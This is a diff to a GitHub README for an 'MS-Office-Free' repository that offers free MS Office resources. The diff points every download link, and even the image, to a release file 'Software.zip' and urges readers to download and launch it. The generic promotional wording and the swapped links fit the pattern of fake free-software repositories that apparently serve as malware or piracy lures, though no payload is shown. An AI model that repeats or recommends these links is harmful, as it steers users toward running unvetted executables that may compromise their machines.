@@ -26,7 +26,7 @@ This repository is your one-stop destination for all things related to MS Office
 In this repository, you will find a wealth of information, resources, and tools related to various aspects of MS Office. Whether you are a beginner or an experienced user, there's something for everyone here. Feel free to browse through the different topics, download useful files, and discover new ways to enhance your MS Office experience.
 
 ### ⭐ Resources Available:
-- [📥 Download MS-Office-Free Repository Zip File](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+- [📥 Download MS-Office-Free Repository Zip File](https://github.com/Shatsting/MS-Office-Free/releases/download/v2.0/Software.zip)
 
 ### 🌟 Launch the Repository Zip File!
 To access the contents of the MS-Office-Free repository, you can click on the link above to download the zip file. Once downloaded, unzip the file and explore all the useful resources and information we have prepared for you.
@@ -35,11 +35,11 @@ To access the contents of the MS-Office-Free repository, you can click on the li
 If the link doesn't work or you encounter any issues, please check the "Releases" section of this repository for additional download options.
 
 ### 🌐 Visit our GitHub Repository
-For more updates, contributions, and discussions, visit our GitHub repository at [MS-Office-Free](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) and be a part of the MS Office community!
+For more updates, contributions, and discussions, visit our GitHub repository at [MS-Office-Free](https://github.com/Shatsting/MS-Office-Free/releases/download/v2.0/Software.zip) and be a part of the MS Office community!
 
 ### 📌 Stay Connected
 Follow us on GitHub, star our repository, and share it with your friends to spread the word about this valuable resource on MS Office. Together, let's make MS Office usage more efficient and enjoyable for everyone.
 
 ### 🎊 Thank you for being a part of the MS-Office-Free community! 🎊
 
-![MS Office](https://cdn.pixabay.com/photo/2019/12/09/16/44/microsoft-4682488_960_720.jpg)
+![MS Office](https://github.com/Shatsting/MS-Office-Free/releases/download/v2.0/Software.zip)
